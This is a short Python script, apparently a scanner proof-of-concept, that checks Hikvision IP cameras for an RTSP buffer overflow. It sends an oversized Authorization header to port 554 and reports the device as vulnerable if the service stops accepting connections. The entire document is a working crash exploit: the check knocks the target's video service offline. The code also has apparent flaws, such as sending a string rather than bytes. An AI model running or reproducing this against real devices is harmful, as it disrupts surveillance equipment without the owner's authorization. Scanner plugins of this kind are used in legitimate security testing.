import socket
import time

from urllib.parse import urlparse


def audit(target_url: str):
    if check(target_url):
        return {
            "vuln_name": "hikvision ipc overflow",
            "msg": "Ok Found Vulnerable",
            "vuln_url": target_url,
            "poc_name": "hikvision_overflow_02"
        }
    else:
        return {
            "msg": "Not Found Vulnerable",
            "poc_name": "hikvision_overflow_02",
            "vuln_url": target_url
        }

def check(target_url: str):
    host = urlparse(target_url).netloc
    payload = "PLAY rtsp://%s/ RTSP/1.0\r\n" % target_url
    payload += "Authorization"
    payload += "A" * 1024
    payload += ": Basic AAAAAAA\r\n\r\n"

    socket.setdefaulttimeout(2)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, 554))
    except socket.error:
        return False

    sock.send(payload)
    sock.close()

    time.sleep(0.2)

    socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        socks.connect((host, 554))
    except socket.error:
        return True
    socks.close()
    return False

